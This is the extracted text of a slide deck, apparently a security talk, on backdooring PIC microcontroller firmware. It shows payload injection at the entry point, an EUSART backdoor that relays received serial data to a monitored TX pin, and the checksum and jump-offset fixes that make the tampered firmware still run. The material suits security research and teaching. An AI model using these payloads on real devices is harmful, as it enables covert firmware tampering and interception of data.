MICROCONTROLLERS VS MICROPROCESSORS_

Microprocessors Intel, AMD, ARM

Microcontrollers Microchip, ATMEL, ST
...

MICROPROCESSORS OVERVIEW_
 Microprocessors = CPU  Memories and I/O busses are physically separated.  Usually bigger than a microcontroller.  Greater processing capacity.
 Modified-Harvard memory organization.  32 or 64 bits (most common).
@UnaPibaGeek

MICROCONTROLLERS OVERVIEW_
 Microcontrollers = CPU + RAM + ROM + I/O busses  Smaller CPU with less processing capacity.  Usually smaller size than microprocessors.
 Harvard memory organization.  16 bits (most common).  A little stack.

@UnaPibaGeek

Using MPLAB X IDE to read (and dump) the program memory

PROGRAM MEMORY DUMP (STEP 3)_

@UnaPibaGeek

Load the .hex file in the MPLAB X IDE

CODE VS DISASSEMBLY (EXAMPLE)_

PAYLOAD INJECTION: AT THE ENTRY POINT_
@UnaPibaGeek

PROGRAM STANDARD STRUCTURE (PIC)_

@UnaPibaGeek

Reset Vector: always at 0x0000 memory address Interrupt Vector: at 0x0008 and 0x0018 memory addresses
Program entry point

LOCATING THE ENTRY POINT_

Entry point
Simple program example

Example 1 -- Entry point: 0x06 Example 2 -- Entry point: 0x7F84
@UnaPibaGeek

Large program example
Memory address to inject Memory address to inject

GENERATING THE PAYLOAD #1 (PoC)_

BCF TRISD,1 BSF PORTD,1 BCF TRISD,2 BSF PORTD,2

// Set PIN as output // Turn ON a LED // Set PIN as output // Turn ON a LED

0x9295 = BCF TRISD,1 0x8283 = BSF PORTD,1

0x9495 = BCF TRISD,2 0x8483 = BSF PORTD,2

Little Endian: 0x9592 0x8382 0x9594 0x8384

INJECTING THE PAYLOAD_

Entry point offset

Entry point at 0x28

Original program memory (.hex dump)

Checksum

@UnaPibaGeek

Payload injected at entry point (0x28)

CHECKSUM RECALCULATION_
Sum(bytes on the line) = Not +1 = checksum
Example: :1000000003EF00F00000959E838E836A000E956E 10+00+00+00+03+EF+00+F0+00+00+95+9E+83+8E+83+6A+00+0E+95+6E = 0x634
Not(0x634) +1 = 0xFFFF 0xFFFF 0xFFFF 0xF9CC
Checksum = 0xCC

INTERRUPTION FLAGS_

XXIE = Interruption Enabled XXIF = Interruption Flag
Registers PIE1, PIE2 and PIE3 have interruption enabling bits Registers PIR1, PIR2 and PIR3 have interruption flags bits

POLLING INSPECTION_
PIR1, 5
Call to RC interruption routine

@UnaPibaGeek

PIR1, 5 = PIR1, RCIF

MEMORY ADDRESSES TO INJECT A PAYLOAD_

@UnaPibaGeek

0x48 to inject a payload at the RC interruption 0x4E to inject a payload at Timer0 interruption 0x56 to inject a payload at the AD interruption 0x5E to inject a payload at the INT0 interruption

BACKDOORING THE EUSART COMMUNICATION PERIPHERAL_
Step 1: locate where the RC interruption routine begins (by inspecting the polling)

Call to RC interruption routine

0x48 RC interruption routine begins

@UnaPibaGeek

BACKDOORING THE EUSART COMMUNICATION PERIPHERAL_

Step 2: Cook a payload that makes a relaying of the received data to a TX peripheral which we are able to monitor externally (example)

MOVF BSF BCF BSF MOVWF

RCREG, W TXSTA, TXEN TXSTA, SYNC RCSTA, SPEN TXREG

// Move the received data to "W" register // Enable transmission // Set asynchronous operation // Set TX/CK pin as an output // Move received data (in W) to TXREG to be re-transmitted

@UnaPibaGeek

0xAE50 0xAC8A 0xAC98 0xAB8E 0xAD6E

BACKDOORING THE EUSART COMMUNICATION PERIPHERAL_
Step 3: lnject the payload where the RC interruption routine begins
0x48 RC interruption routine begins

FIXING JUMPS: FLOW CORRUPTION_

Original program @UnaPibaGeek

Program after payload injection

FIXING JUMPS: GOTO AND CALL OPCODES_

GOTO opcode = 0xEF

CALL opcode = 0xEC

NOP opcode = 0xF0

EF06 F000 = GOTO jumping to 0x0006 offset (0x000C memory address). EC67 F004 = CALL jumping to 0x0467 offset (0x08CE memory address).

Jump to 0x8CE (memory address) / 2 = 0x0467 offset
@UnaPibaGeek

FIXING JUMPS: RECALCULATION_

Payload injected at memory address: 0x48 Payload length: 10 bytes

Example:

CALL 0x56 (EC2B F000)

Original jump

CALL 0x60 (EC30 F000)

Fixed jump

Original offset + payload length

Three CALL fixed after injection

RETURN

// SP increment // TOSU = 0x00 // TOSH = 0x0C // TOSL = 0x72

Jump to 0x000C72

Jump to 0x000024

@UnaPibaGeek

SP Increment TOS = 0x000024
